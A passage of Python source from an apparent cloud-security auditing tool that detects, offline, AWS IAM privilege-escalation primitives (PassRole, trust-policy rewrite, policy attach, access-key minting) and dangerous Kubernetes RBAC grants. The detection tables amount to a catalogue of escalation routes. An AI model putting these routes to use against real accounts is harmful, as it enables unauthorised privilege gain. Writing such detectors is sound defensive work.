# gain uses HAS_GRANT/OWNS). Nothing outside this table can ever synthesize an edge.
_IAM_ESCALATION_PRIMITIVES: "dict[str, dict[str, Any]]" = {
    "assume_role_trust_rewrite": {
        "all": ("sts:assumerole", "iam:updateassumerolepolicy"), "any": (), "any_scope": "cover",
        "edge": "assume", "cover": "via", "family": "grant_gain",
        "label": "trust-policy rewrite (sts:AssumeRole + iam:UpdateAssumeRolePolicy)",
    },
    "pass_role_to_compute": {
        "all": ("iam:passrole",), "any": _IAM_COMPUTE_RUN_ACTIONS, "any_scope": "anywhere",
        "edge": "assume", "cover": "via", "family": "grant_gain",
        "label": "iam:PassRole to a compute service (a run/create action)",
    },
    "attach_user_policy": {
        "all": (), "any": ("iam:attachuserpolicy", "iam:putuserpolicy"), "any_scope": "cover",
        "edge": "grant_admin", "cover": "base", "family": "grant_gain",
        "label": "self policy-attach (iam:AttachUserPolicy / iam:PutUserPolicy)",
    },
    "add_user_to_group": {
        "all": ("iam:addusertogroup",), "any": (), "any_scope": "cover",
        "edge": "member_of", "cover": "via", "family": "grant_gain",
        "label": "add-to-privileged-group (iam:AddUserToGroup)",
    },
    "create_access_key": {
        "all": (), "any": ("iam:createaccesskey", "iam:createloginprofile"), "any_scope": "cover",
        "edge": "assume", "cover": "via", "family": "credential_mint",
        "label": "create-credential-for-target (iam:CreateAccessKey / iam:CreateLoginProfile)",
    },
}

# The credential-mint primitives — the projection uses the HELD-credential chain for these (a credential
# minted FOR the target), and HAS_GRANT/OWNS for everything else (a role/permission gain).
_IAM_CREDENTIAL_MINT_PRIMITIVES: "frozenset[str]" = frozenset(
    k for k, v in _IAM_ESCALATION_PRIMITIVES.items() if v["family"] == "credential_mint")


def _iam_norm_action(value: Any) -> str:
    """Canonical (lower-cased, stripped) IAM action token."""
    return _imds_text(value).strip().lower()


def _iam_as_list(value: Any) -> "list[str]":
    """Normalize an IAM Action/Resource field (a single string OR a list of strings) to a list of strings.
    A string is a single-element list (NOT iterated char-by-char); anything else is dropped. Never raises."""
    if isinstance(value, str):
        return [value]
    if isinstance(value, Sequence):
        return [x for x in value if isinstance(x, str)]
    return []


def _iam_glob_matches(pattern: str, target: str) -> bool:
    """True iff an IAM glob ``pattern`` (``*`` any run, ``?`` one char — the only wildcards IAM uses) matches
    the whole lower-cased ``target``. ``*`` alone matches everything; a wildcard that EXCLUDES the target
    (``role/dev-*`` vs ``role/admin``) does NOT match. Both are already lower-cased. Anchored, non-backtracking
    over fixed alternations, ReDoS-safe."""
    if not pattern or not target:
        return False
    if pattern == "*":
        return True
    rx = "^" + re.escape(pattern).replace(r"\*", ".*").replace(r"\?", ".") + "$"
    return re.match(rx, target) is not None


def _iam_action_matches(action_pattern: Any, required: str) -> bool:
    """True iff an IAM action PATTERN (which may wildcard: ``*``, ``iam:*``, ``iam:Attach*``) matches the
    lower-cased ``required`` action."""
    return _iam_glob_matches(_iam_norm_action(action_pattern), required)


def _iam_resource_covers(resource_pattern: Any, target: str) -> bool:
    """True iff an IAM resource PATTERN covers the lower-cased ``target`` id (the graph/via/base id space —
    the capture uses CONSISTENT ids exactly like ``policy_path``). ``*`` covers everything; a wildcard that
    excludes the target does NOT cover it (the FP trap)."""
    return _iam_glob_matches(_imds_text(resource_pattern).strip().lower(), _norm_id(target))


def _iam_stmt_allows(stmt: Any, action: str, target: str) -> bool:
    """A single statement UNCONDITIONALLY Allows ``action`` over ``target``: Effect==Allow, NO Condition (a
    conditional grant is not unconditional), NO NotAction (an inverted action set is ambiguous), some Action
    pattern matches, some Resource pattern covers the target. Condition / NotAction / a non-covering resource
    all return False — the fail-closed FP traps."""
    if not isinstance(stmt, Mapping):
        return False
    if _imds_text(stmt.get("effect") or stmt.get("Effect")).strip().lower() != "allow":
        return False
    if stmt.get("condition") or stmt.get("Condition"):
        return False
    if stmt.get("not_action") or stmt.get("NotAction"):
        return False
    actions = _iam_as_list(stmt.get("action") or stmt.get("Action"))
    resources = _iam_as_list(stmt.get("resource") or stmt.get("Resource"))
    if not any(_iam_action_matches(a, action) for a in actions):
        return False
    return any(_iam_resource_covers(r, target) for r in resources)


def _iam_stmt_allows_somewhere(stmt: Any, action: str) -> bool:
    """A statement UNCONDITIONALLY Allows ``action`` over SOME (any) resource — the PassRole run-action leg,
    whose compute resource (an instance/function) is not the passed role. Same unconditional guards
    (Effect==Allow, no Condition, no NotAction, an action match, at least one Resource present)."""
    if not isinstance(stmt, Mapping):
        return False
    if _imds_text(stmt.get("effect") or stmt.get("Effect")).strip().lower() != "allow":
        return False
    if stmt.get("condition") or stmt.get("Condition"):
        return False
    if stmt.get("not_action") or stmt.get("NotAction"):
        return False
    actions = _iam_as_list(stmt.get("action") or stmt.get("Action"))
    resources = _iam_as_list(stmt.get("resource") or stmt.get("Resource"))
    return bool(resources) and any(_iam_action_matches(a, action) for a in actions)


def _iam_stmt_denies(stmt: Any, action: str, target: str) -> bool:
    """A statement DENIES ``action`` over ``target`` (deny-precedence, fail-closed). A ``Deny NotAction=[X]``
    denies everything EXCEPT X, so it denies ``action`` UNLESS ``action`` matches a NotAction pattern. A plain
    ``Deny Action=… Resource=…`` denies on an action+resource match. A Deny with no Resource is treated as
    covering the target (IAM requires a Resource; absent -> fail-closed to blocking)."""
    if not isinstance(stmt, Mapping):
        return False
    if _imds_text(stmt.get("effect") or stmt.get("Effect")).strip().lower() != "deny":
        return False
    resources = _iam_as_list(stmt.get("resource") or stmt.get("Resource"))
    covers = (not resources) or any(_iam_resource_covers(r, target) for r in resources)
    if not covers:
        return False
    not_action = _iam_as_list(stmt.get("not_action") or stmt.get("NotAction"))
    if not_action:
        return not any(_iam_action_matches(na, action) for na in not_action)
    actions = _iam_as_list(stmt.get("action") or stmt.get("Action"))
    return any(_iam_action_matches(a, action) for a in actions)


def _iam_stmt_denies_anywhere(stmt: Any, action: str) -> bool:
    """A Deny that could block ``action`` over SOME resource — the fail-closed dual of the ``anywhere`` ALLOW
    leg (the PassRole run-action's compute resource, e.g. an instance/function, is NOT the passed role, so its
    id is unknown to the capture). Since the specific resource cannot be known, ANY Deny on the action is
    treated as potentially blocking: over-approximating denies is the SAFE direction (fewer escalation FACTs).
    A ``Deny NotAction=[X]`` denies everything except X; a plain ``Deny Action=…`` denies on an action match.
    Resource is IGNORED here (a resource-scoped run-action Deny — e.g. ``Deny ec2:RunInstances
    Resource=instance/*`` — really does block the launch, so it must suppress the FACT even though it does not
    cover the passed role)."""
    if not isinstance(stmt, Mapping):
        return False
    if _imds_text(stmt.get("effect") or stmt.get("Effect")).strip().lower() != "deny":
        return False
    not_action = _iam_as_list(stmt.get("not_action") or stmt.get("NotAction"))
    if not_action:
        return not any(_iam_action_matches(na, action) for na in not_action)
    actions = _iam_as_list(stmt.get("action") or stmt.get("Action"))
    return any(_iam_action_matches(a, action) for a in actions)


def _iam_effective_allow(action: str, target: str, id_stmts: "list", boundary_stmts: "list | None",
                         scp_stmts: "list | None", *, anywhere: bool = False) -> bool:
    """UNCONDITIONAL effective allow of ``action`` over ``target`` (or, with ``anywhere``, over ANY resource):
    allowed by the IDENTITY policy AND — when present — by the permissions BOUNDARY AND by the SCP, with NO
    Deny at ANY layer. A permissions boundary / SCP that is PRESENT but does NOT allow the action RESTRICTS
    it -> not allowed (the boundary/SCP FP trap, fail-closed). ``boundary_stmts``/``scp_stmts`` are None when
    ABSENT (no restriction) and a (possibly empty) list when present (empty -> denies all). With ``anywhere``
    the DENY check is resource-agnostic too (``_iam_stmt_denies_anywhere``): a Deny on the run action at ANY
    scope suppresses the FACT, because the run leg's compute resource is unknown and a resource-scoped Deny
    (e.g. ``Deny ec2:RunInstances Resource=instance/*``) genuinely blocks the launch."""
    def allows(s: Any) -> bool:
        return _iam_stmt_allows_somewhere(s, action) if anywhere else _iam_stmt_allows(s, action, target)

    def denies(s: Any) -> bool:
        return _iam_stmt_denies_anywhere(s, action) if anywhere else _iam_stmt_denies(s, action, target)

    for layer in (id_stmts, boundary_stmts or [], scp_stmts or []):
        if any(denies(s) for s in layer):
            return False
    if not any(allows(s) for s in id_stmts):
        return False
    if boundary_stmts is not None and not any(allows(s) for s in boundary_stmts):
        return False
    if scp_stmts is not None and not any(allows(s) for s in scp_stmts):
        return False
    return True


def _iam_build_adj_grants(graph: Mapping[str, Any]) -> "tuple[dict, dict]":
    """Build the principal->principal adjacency (assume/member closure) and principal->[(resource, access)]
    grants from a retained policy graph — the SAME model ``policy_path_oracle`` searches. Deterministic;
    malformed entries are skipped, never raised."""
    adj: "dict[str, list[str]]" = {}
    for rel_key in ("assume", "member_of"):
        for e in graph.get(rel_key) or []:
            if not isinstance(e, Mapping):
                continue
            src, dst = _norm_id(e.get("src")), _norm_id(e.get("dst"))
            if src and dst:
                adj.setdefault(src, []).append(dst)
    grants: "dict[str, list[tuple[str, str]]]" = {}
    for g in graph.get("grants") or []:
        if not isinstance(g, Mapping):
            continue
        p, r = _norm_id(g.get("principal")), _norm_id(g.get("resource"))
        if p and r:
            grants.setdefault(p, []).append((r, str(g.get("access") or "")))
    return adj, grants


def _iam_reaches(adj: Mapping[str, "list[str]"], grants: Mapping[str, "list[tuple[str, str]]"],
                 start: str, target: str, requested: str) -> bool:
    """BFS: does ``start`` reach the resource ``target`` with ``requested`` access over the assume/member
    closure? Mirrors ``policy_path_oracle``'s search (sorted adjacency -> deterministic)."""
    order, seen = [start], {start}
    i = 0
    while i < len(order):
        cur = order[i]
        i += 1
        for res, acc in grants.get(cur, ()):
            if res == target and _access_grants(acc, requested):
                return True
        for nxt in sorted(adj.get(cur, ())):
            if nxt not in seen:
                seen.add(nxt)
                order.append(nxt)
    return False


# IAM action verb classification for the SYMMETRIC base fold (defect: strict-gain base asymmetry). A verb
# prefix set, checked write-before-read; an unknown named action grants at least read-tier (conservative).
_IAM_WRITE_VERB_PREFIXES: "tuple[str, ...]" = (
    "create", "put", "delete", "update", "modify", "write", "attach", "detach", "add", "remove", "set",
    "replace", "assume", "pass", "enable", "disable", "authorize", "revoke", "associate", "disassociate",
    "start", "stop", "run", "invoke", "import", "restore", "reset",
)
_IAM_READ_VERB_PREFIXES: "tuple[str, ...]" = (
    "get", "list", "describe", "read", "view", "lookup", "head", "select", "query", "scan", "batchget",
    "generate", "decrypt", "search",
)
_IAM_ACCESS_RANK: "dict[str, int]" = {"read": 2, "write": 3, "admin": 4}


def _iam_action_service(action: Any) -> str:
    """The AWS service prefix of an IAM action (``s3:GetObject`` -> ``s3``); ``*`` -> ``*`` (any service)."""
    a = _iam_norm_action(action)
    if a == "*":
        return "*"
    return a.split(":", 1)[0] if ":" in a else a


def _iam_target_service(target: Any) -> str:
    """The service of a target resource id (``s3/crown-jewels`` -> ``s3``, ``arn:aws:kms:…`` -> ``arn`` —
    keep capture ids in the ``service/name`` space, exactly as ``policy_path`` uses canonical ids)."""
    t = _norm_id(target)
    if "/" in t:
        return t.split("/", 1)[0]
    if ":" in t:
        return t.split(":", 1)[0]
    return t


def _iam_action_access_token(action: Any) -> str:
    """The access-lattice token an IAM action grants: ``*`` / ``svc:*`` -> admin; a write-verb -> write; a
    read-verb (or an unknown named action, conservatively) -> read."""
    a = _iam_norm_action(action)
    if a == "*":
        return "admin"
    verb = a.split(":", 1)[1] if ":" in a else a
    if verb in ("", "*"):
        return "admin"
    for p in _IAM_WRITE_VERB_PREFIXES:
        if verb.startswith(p):
            return "write"
    for p in _IAM_READ_VERB_PREFIXES:
        if verb.startswith(p):
            return "read"
    return "read"


def _iam_identity_target_access(target: str, id_stmts: "list") -> "str | None":
    """The access token at which the base principal's OWN identity policy DIRECTLY reaches ``target`` — the
    SYMMETRIC base fold that makes the base closure see the SAME action-level evidence the escalation side
    does (defect #1: base asymmetry). Considers only UNCONDITIONAL Allows (no Condition, no NotAction) whose
    Resource covers ``target`` AND whose action's SERVICE matches the target's service (or ``*``), so an
    ``iam:*`` grant does NOT fold as reach over an ``s3`` target. Returns the HIGHEST such access token, or
    None. Over-approximating base reach is the FAIL-CLOSED direction (a larger base closure = fewer escalation
    FACTs); denies are deliberately NOT subtracted here (subtracting them would SHRINK the base closure and
    make escalation EASIER to claim — the unsafe direction)."""
    tsvc = _iam_target_service(target)
    best: "str | None" = None
    for s in id_stmts:
        if not isinstance(s, Mapping):
            continue
        if _imds_text(s.get("effect") or s.get("Effect")).strip().lower() != "allow":
            continue
        if s.get("condition") or s.get("Condition") or s.get("not_action") or s.get("NotAction"):
            continue
        resources = _iam_as_list(s.get("resource") or s.get("Resource"))
        if not any(_iam_resource_covers(r, target) for r in resources):
            continue
        for a in _iam_as_list(s.get("action") or s.get("Action")):
            asvc = _iam_action_service(a)
            if asvc != "*" and asvc != tsvc:
                continue   # a cross-service action does not grant reach over this target
            tok = _iam_action_access_token(a)
            if best is None or _IAM_ACCESS_RANK[tok] > _IAM_ACCESS_RANK[best]:
                best = tok
    return best


def iam_escalation_oracle(observed: Any) -> OracleSignal:
    """Fire when RETAINED IAM statements grant a principal an UNCONDITIONAL escalation PRIMITIVE that
    STRICTLY increases what it can reach — the E2 (BUILD-PLAN §E2) achieved-escalation confirmation, the
    stronger dual of ``policy_path_oracle`` (mere reachability). Pure + deterministic, re-verifies OFFLINE.

    ``observed`` is the JSON-safe retained capture::

        {"base_principal": "role/dev",
         "target_resource": "s3/crown-jewels", "target_access": "admin"?,   # "" = any grant path
         "graph": { "grants":[{principal,resource,access}], "assume":[{src,dst}], "member_of":[{src,dst}] },
         "escalation": {
             "primitive": "assume_role_trust_rewrite" | "pass_role_to_compute" | "attach_user_policy"
                        | "add_user_to_group" | "create_access_key",
             "via": "role/admin",                       # the principal the primitive lets base ACT AS
             "statements": [ {effect, action, resource, condition?, not_action?} ],   # base identity policy
             "boundary": {"statements":[…]}?,           # optional permissions boundary (restrictive)
             "scp":      {"statements":[…]}? } }        # optional SCP (restrictive)

    Fires (0.95) ONLY when ALL hold (near-zero-FP by construction):
      (1) STRICT-GAIN precondition — ``base_principal`` does NOT already reach ``target_resource`` in the
          BASE closure (else it is plain reachability, not escalation — the central anti-overclaim guard);
      (2) some primitive from the FIXED set is UNCONDITIONALLY granted (every FP trap fail-closed: a
          Condition, NotAction, explicit Deny / deny-precedence, restricting boundary/SCP, or a Resource
          wildcard that does not cover the target contributes NO edge);
      (3) the ONE edge the primitive synthesizes makes ``base_principal`` reach ``target_resource`` in the
          ESCALATION-CLOSED closure. (2)+(3) over (1) = a strict differential gain.

    Does NOT fire (stays an honest LEAD): a target already reachable in the base closure; an unknown /
    unparseable primitive; a primitive whose required actions are not unconditionally allowed; a synthesized
    edge that still does not reach the target; malformed / absent evidence (never raises)."""
    kind = OracleKind.IAM_ESCALATION_PRIMITIVE
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no IAM escalation evidence", observed={"reason": "malformed_capture"})

    base = _norm_id(observed.get("base_principal"))
    target = _norm_id(observed.get("target_resource"))
    requested = str(observed.get("target_access") or "").strip()
    graph = observed.get("graph") if isinstance(observed.get("graph"), Mapping) else {}
    esc = observed.get("escalation") if isinstance(observed.get("escalation"), Mapping) else {}
    if not base or not target:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence="escalation query needs both a base_principal and a target_resource",
            observed={"reason": "incomplete_query", "base_principal": base, "target": target})

    # Parse the escalation statements EARLY — the base fold (defect #1) needs them BEFORE the strict-gain
    # differential, so the base and escalation closures are computed over the SAME action-level evidence.
    id_stmts = [s for s in (esc.get("statements") or []) if isinstance(s, Mapping)]
    boundary = esc.get("boundary")
    scp = esc.get("scp")
    boundary_stmts = ([s for s in (boundary.get("statements") or []) if isinstance(s, Mapping)]
                      if isinstance(boundary, Mapping) else None)
    scp_stmts = ([s for s in (scp.get("statements") or []) if isinstance(s, Mapping)]
                 if isinstance(scp, Mapping) else None)

    adj, grants = _iam_build_adj_grants(graph)
    # SYMMETRIC BASE FOLD (defect #1: base asymmetry). Fold the base principal's OWN unconditional identity-
    # policy Allows that DIRECTLY reach `target` (same service, resource covers target) into base_grants, so
    # the base closure sees the SAME action-level evidence the escalation side does — an attacker who already
    # reaches the target via a direct Allow (not represented as a coarse resource-grant edge) is NOT counted
    # as a strict gain. base_grants is the SHARED base for BOTH closures; the ONLY delta is the ONE
    # synthesized primitive edge, so strict-gain is an honest differential (esc_closure \ base_closure).
    base_grants = {k: list(v) for k, v in grants.items()}
    folded = _iam_identity_target_access(target, id_stmts)
    if folded is not None:
        base_grants.setdefault(base, []).append((target, folded))

    # (1) STRICT-GAIN precondition — base must NOT already reach the target over the FOLDED base closure
    #     (else it is plain reachability, not escalation). The central anti-overclaim guard.
    if _iam_reaches(adj, base_grants, base, target, requested):
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"{base!r} ALREADY reaches {target!r} in the base closure (a direct identity-policy Allow "
                      f"or an existing grant path) without escalating — this is reachability (policy_path), "
                      f"NOT a strict escalation gain (stays a LEAD)"),
            observed={"reason": "no_strict_gain_already_reachable", "base_principal": base, "target": target})

    primitive = _imds_text(esc.get("primitive")).strip().lower()
    spec = _IAM_ESCALATION_PRIMITIVES.get(primitive)
    if spec is None:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"escalation primitive {primitive!r} is not in the fixed auditable set "
                      f"{sorted(_IAM_ESCALATION_PRIMITIVES)} — no edge is synthesized (stays a LEAD)"),
            observed={"reason": "unknown_primitive", "primitive": primitive})

    via = _norm_id(esc.get("via"))
    cover = via if spec["cover"] == "via" else base
    if spec["cover"] == "via" and not via:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the {primitive!r} primitive names no `via` principal to escalate to — no edge can be "
                      f"synthesized (stays a LEAD)"),
            observed={"reason": "no_via_principal", "primitive": primitive})

    # (2) every REQUIRED action UNCONDITIONALLY allowed over `cover`; and, when the primitive has an
    #     alternative set, at least ONE of it (over `cover`, or over ANY resource for the PassRole run leg).
    for action in spec["all"]:
        if not _iam_effective_allow(action, cover, id_stmts, boundary_stmts, scp_stmts):
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"the {primitive!r} primitive requires an UNCONDITIONAL Allow of {action!r} over "
                          f"{cover!r}, but the retained statements do not grant it (a Condition, NotAction, "
                          f"Deny, restricting boundary/SCP, or a resource wildcard that excludes the target "
                          f"— stays a LEAD)"),
                observed={"reason": "action_not_unconditionally_allowed", "primitive": primitive,
                          "action": action, "cover": cover})
    if spec["any"]:
        anywhere = spec["any_scope"] == "anywhere"
        matched = [a for a in spec["any"]
                   if _iam_effective_allow(a, cover, id_stmts, boundary_stmts, scp_stmts, anywhere=anywhere)]
        if not matched:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"the {primitive!r} primitive requires at least one of {list(spec['any'])} "
                          f"{'over any resource' if anywhere else f'over {cover!r}'}, but none is "
                          f"unconditionally allowed (stays a LEAD)"),
                observed={"reason": "no_alternative_action_allowed", "primitive": primitive, "cover": cover})

    # (3) synthesize the ONE new capability edge and re-run the differential over the escalation-closed graph
    #     (a COPY of the FOLDED base closure — base_grants — plus the ONE new edge, so the ONLY delta vs the
    #     base closure is the primitive edge).
    esc_adj = {k: list(v) for k, v in adj.items()}
    esc_grants = {k: list(v) for k, v in base_grants.items()}
    if spec["edge"] in ("assume", "member_of"):
        esc_adj.setdefault(base, []).append(via)
        new_edge = f"{base} -[{spec['edge']}]-> {via}"
    else:   # grant_admin — self policy-attach grants base a direct admin grant over the target resource
        esc_grants.setdefault(base, []).append((target, "admin"))
        new_edge = f"{base} -[has_grant admin]-> {target}"

    if not _iam_reaches(esc_adj, esc_grants, base, target, requested):
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the {primitive!r} primitive synthesizes {new_edge}, but {base!r} STILL does not reach "
                      f"{target!r} in the escalation-closed closure — no strict gain (stays a LEAD)"),
            observed={"reason": "edge_does_not_reach_target", "primitive": primitive,
                      "synthesized_edge": new_edge, "target": target})

    return OracleSignal(
        kind=kind, fired=True, confidence=0.95,
        evidence=(f"IAM privilege-escalation PRIMITIVE ({spec['label']}): the RETAINED IAM configuration "
                  f"PERMITS {base!r} this escalation primitive UNCONDITIONALLY, synthesizing {new_edge}, which "
                  f"lets {base!r} reach {target!r}{(' with access '+requested) if requested else ''} — a STRICT "
                  f"gain (unreachable in the base closure, reachable in the escalation-closed closure). This is "
                  f"a CAPABILITY over the retained config: the identity policy + boundary + SCP permit it, but "
                  f"a resource-based policy (a KMS key policy, an S3 bucket policy, the target role's trust "
                  f"Deny) NOT present in the capture could still nullify it. SUBJECT = the retained IAM policy "
                  f"statements; VIGIL re-derives the permitted escalation over the retained evidence offline "
                  f"(no cloud, no attack)."),
        observed={"reason": "iam_escalation_permitted", "primitive": primitive, "family": spec["family"],
                  "base_principal": base, "via": via, "target": target, "requested_access": requested,
                  "synthesized_edge": new_edge})


# ---------------------------------------------------------------------------
# E4 TIER-2 (BUILD-PLAN §E4·TIER-2) — K8s dangerous-VERB / default-ServiceAccount RBAC verb-GRANT.
# See OracleKind.K8S_RBAC_VERB_GRANT. A STRONGER, SEPARATE oracle than TIER-1 (k8s_workload_posture_oracle):
# TIER-1 fires only for an ANONYMOUS subject bound to a dangerous BUILT-IN ClusterRole matched by exact NAME
# (cluster-admin / admin / edit) — it NEVER parses the role's rules. TIER-2 PARSES the referenced
# Role/ClusterRole's ``rules`` (a SEPARATELY-retained object — a roleRef is only a NAME) to prove a dangerous
# (verb,resource) GRANT, and extends the attacker-occupiable subject set to the namespace-``default``
# ServiceAccount and system:authenticated — GATED by a MANDATORY near-zero-FP fix (an independent adversarial
# review found the naive design mints CRITICAL false FACTs on the SINGLE MOST COMMON legitimate RBAC
# delegation). The two oracles COEXIST as distinct OracleKinds (like K8S_POSTURE / K8S_WORKLOAD_POSTURE).
#
# The capture retains a ``binding`` (subjects + roleRef {name,kind,apiGroup} + binding kind/namespace) AND a
# SEPARATELY-retained ``role_object`` ({name,kind,apiGroup,namespace, rules, rules_source, aggregationRule?}).
# The oracle RE-CHECKS the roleRef->role_object JOIN (never trusts the runner), judges the rules over the
# retained set ALONE (offline, ZERO cluster calls), and applies the SUBJECT-GATED FACT eligibility below.
# ---------------------------------------------------------------------------
_K8S_RBAC_GRANT_STR_CAP = 4096
# RBAC verbs/resources/apiGroups are NORMALIZED (lower+strip) then matched EXACTLY against these token sets;
# an UNKNOWN token can only SUPPRESS a match, never cause a fire.
_K8S_CORE_OR_WILDCARD_GROUPS = frozenset({"", "*"})              # core (or wildcard) apiGroup — shapes (a)/(b)
_K8S_PRIVESC_GROUPS = frozenset({"", "*", "rbac.authorization.k8s.io"})   # RBAC/core apiGroups — shape (c)
_K8S_SECRET_READ_VERBS = frozenset({"get", "list", "watch", "*"})
_K8S_LIST_WATCH_STAR = frozenset({"list", "watch", "*"})        # verbs that IGNORE a resourceNames constraint
_K8S_SECRET_RESOURCES = frozenset({"secrets", "*"})
_K8S_ESCALATE_RESOURCES = frozenset({"roles", "clusterroles", "*"})
_K8S_BIND_RESOURCES = frozenset({"rolebindings", "clusterrolebindings", "*"})
_K8S_IMPERSONATE_RESOURCES = frozenset({"users", "groups", "serviceaccounts", "*"})
# rules are AUTHORITATIVE only from a live API GET (the effective set the API returns); a static manifest is
# FACT-eligible ONLY when the role carries NO aggregationRule (an aggregated role's effective rules are NOT
# in the static manifest — the controller fills them in).
_K8S_LIVE_RULE_SOURCES = frozenset({"live_clusterrole_get", "live_role_get"})
# The honest EFFECT phrase per dangerous shape (worded for the FACT sentence).
_K8S_GRANT_SHAPE_EFFECT = {
    "full_wildcard": "exercise ALL verbs on ALL resources (cluster-admin-equivalent)",
    "secret_read": "read (get/list/watch) Secrets",
    "priv_esc": "escalate privilege via escalate/bind/impersonate on RBAC objects",
}


def _k8s_grant_token_set(values: Any) -> "frozenset[str]":
    """A NORMALIZED (lower+strip, capped) token SET from a PolicyRule field (verbs/resources/apiGroups). A
    non-list yields the empty set; unknown tokens are retained but only ever SUPPRESS a match."""
    if not isinstance(values, (list, tuple)):
        return frozenset()
    return frozenset(_k8s_norm(v) for v in values)


def _k8s_rule_has_resource_names(rule: Mapping[str, Any]) -> bool:
    """True IFF the rule carries a NON-EMPTY ``resourceNames`` constraint (a per-object scoping that limits
    get/delete/update to named objects; list/watch/* ignore it, so a wildcard/list rule is NOT so constrained)."""
    rn = rule.get("resourceNames")
    if rn is None:
        rn = rule.get("resource_names")
    return isinstance(rn, (list, tuple)) and any(_coerce_text(x).strip() for x in rn)


def _k8s_rule_shapes(rule: Any) -> "set[str]":
    """The set of dangerous shapes a SINGLE PolicyRule exhibits — a subset of {full_wildcard, secret_read,
    priv_esc}. All over NORMALIZED tokens with EXACT membership; an unknown token can only suppress."""
    if not isinstance(rule, Mapping):
        return set()
    verbs = _k8s_grant_token_set(rule.get("verbs"))
    resources = _k8s_grant_token_set(rule.get("resources") if rule.get("resources") is not None
                                     else rule.get("resource"))
    groups = _k8s_grant_token_set(rule.get("apiGroups") if rule.get("apiGroups") is not None
                                  else rule.get("api_groups"))
    shapes: set[str] = set()
    # (a) FULL WILDCARD — cluster-admin-equivalent: * verbs AND * resources in the core/wildcard apiGroup.
    if "*" in verbs and "*" in resources and (groups & _K8S_CORE_OR_WILDCARD_GROUPS):
        shapes.add("full_wildcard")
    # (b) SECRET READ — get/list/watch/* on secrets in the core/wildcard apiGroup. A get-only rule constrained
    #     by a NON-EMPTY resourceNames is EXCLUDED (a single named secret); list/watch/* IGNORE resourceNames.
    if (verbs & _K8S_SECRET_READ_VERBS) and (resources & _K8S_SECRET_RESOURCES) \
            and (groups & _K8S_CORE_OR_WILDCARD_GROUPS):
        if not (_k8s_rule_has_resource_names(rule) and not (verbs & _K8S_LIST_WATCH_STAR)):
            shapes.add("secret_read")
    # (c) PRIV-ESC verbs in the RBAC/core apiGroups: escalate on roles/clusterroles/*, bind on
    #     rolebindings/clusterrolebindings/*, impersonate on users/groups/serviceaccounts/*.
    if groups & _K8S_PRIVESC_GROUPS:
        if ("escalate" in verbs and (resources & _K8S_ESCALATE_RESOURCES)) \
                or ("bind" in verbs and (resources & _K8S_BIND_RESOURCES)) \
                or ("impersonate" in verbs and (resources & _K8S_IMPERSONATE_RESOURCES)):
            shapes.add("priv_esc")
    return shapes


def _k8s_subject_class(s: Any) -> str:
    """Classify a binding subject into the FIXED attacker-occupiable set S, or ``""`` (a NAMED subject, not in
    S). Comparisons are EXACT (case- and whitespace-sensitive), like ``_k8s_subject_is_anon``.
      ``anon``       — User system:anonymous / Group system:unauthenticated (reuse ``_k8s_subject_is_anon``);
      ``default_sa`` — the typed namespace-``default`` ServiceAccount ``default`` (kind/namespace/name EXACT,
                       core/empty apiGroup — a ServiceAccount is not in the RBAC apiGroup);
      ``all_auth``   — the Group ``system:authenticated`` (Groups carry the RBAC apiGroup, like anon).
    Any NAMED user/group/SA (including ``default/<named-app>``) returns ``""`` and is NOT in S."""
    if _k8s_subject_is_anon(s):
        return "anon"
    if isinstance(s, Mapping):
        kind = _coerce_text(s.get("kind"))
        name = _coerce_text(s.get("name"))
        ns = _coerce_text(s.get("namespace") if s.get("namespace") is not None else s.get("ns"))
        api_group = _coerce_text(s.get("api_group") or s.get("apiGroup"))
        if kind == "ServiceAccount" and ns == "default" and name == "default" and api_group == "":
            return "default_sa"
        if kind == "Group" and name == "system:authenticated" and api_group == _K8S_RBAC_APIGROUP:
            return "all_auth"
        return ""
    # legacy STRING subject (a live-read RBAC sensor may emit a reserved name directly): only the
    # all-authenticated pseudo-group is representable as a bare string here (anon is handled above).
    return "all_auth" if _coerce_text(s) == "system:authenticated" else ""


def _k8s_roleref_role_object_linked(binding: Mapping[str, Any],
                                    role_obj: Mapping[str, Any]) -> "tuple[bool, str]":
    """(I) IDENTITY LINKAGE — re-check the roleRef->role_object JOIN over the retained evidence, NEVER trust
    the runner's say-so. ALL comparisons EXACT (case/whitespace-sensitive). roleRef.name==role_object.name;
    roleRef.kind==role_object.kind∈{ClusterRole,Role}; roleRef.apiGroup==role_object.apiGroup==the RBAC group
    (NO empty-string tolerance — a stronger claim than TIER-1). Role => the binding is a RoleBinding AND the
    role_object.namespace==binding.namespace; ClusterRole => role_object.namespace is empty. Returns
    ``(linked, reason)``."""
    ref = binding.get("role_ref")
    if not isinstance(ref, Mapping):
        ref = binding.get("roleRef") if isinstance(binding.get("roleRef"), Mapping) else {}
    cap = _K8S_RBAC_GRANT_STR_CAP
    ref_name = _coerce_text(ref.get("name"))[:cap]
    ref_kind = _coerce_text(ref.get("kind"))[:cap]
    ref_group = _coerce_text(ref.get("api_group") or ref.get("apiGroup"))[:cap]
    ro_name = _coerce_text(role_obj.get("name"))[:cap]
    ro_kind = _coerce_text(role_obj.get("kind"))[:cap]
    ro_group = _coerce_text(role_obj.get("api_group") or role_obj.get("apiGroup"))[:cap]
    ro_ns = _coerce_text(role_obj.get("namespace") if role_obj.get("namespace") is not None
                         else role_obj.get("ns"))[:cap]
    if not ref_name or ref_name != ro_name:
        return False, "roleRef.name != role_object.name"
    if ref_kind not in ("ClusterRole", "Role") or ref_kind != ro_kind:
        return False, "roleRef.kind != role_object.kind (or not exactly ClusterRole|Role)"
    if not (ref_group == ro_group == _K8S_RBAC_APIGROUP):
        return False, "roleRef.apiGroup/role_object.apiGroup not exactly rbac.authorization.k8s.io"
    bind_kind = _coerce_text(binding.get("kind"))[:cap]
    bind_ns = _coerce_text(binding.get("namespace") if binding.get("namespace") is not None
                           else binding.get("ns"))[:cap]
    if ref_kind == "Role":
        if bind_kind != "RoleBinding":
            return False, "a namespaced Role roleRef requires a RoleBinding"
        if not ro_ns or ro_ns != bind_ns:
